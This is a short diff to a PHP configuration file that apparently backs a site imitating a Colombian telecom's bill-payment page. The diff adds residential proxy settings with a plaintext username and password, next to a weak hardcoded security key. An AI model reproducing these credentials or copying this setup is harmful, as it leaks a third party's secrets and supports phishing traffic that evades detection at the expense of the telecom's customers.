@@ -34,6 +34,11 @@ return [
     'db_name' => $db_name,
     'db_port' => $db_port,
     'baseUrl' => getenv('BASE_URL') ?: 'https://pagatufacturatigo.vercel.app/updatetele.php',
-    'security_key' => getenv('SECURITY_KEY') ?: 'secure_key_123'
+    'security_key' => getenv('SECURITY_KEY') ?: 'secure_key_123',
+    // Proxy Residencial (Bright Data - Colombia)
+    'proxy_host' => 'brd.superproxy.io',
+    'proxy_port' => '33335',
+    'proxy_user' => 'brd-customer-hl_73fe2062-zone-tigoproxy',
+    'proxy_pass' => 'j4od0e20ohqj'
 ];
 ?>
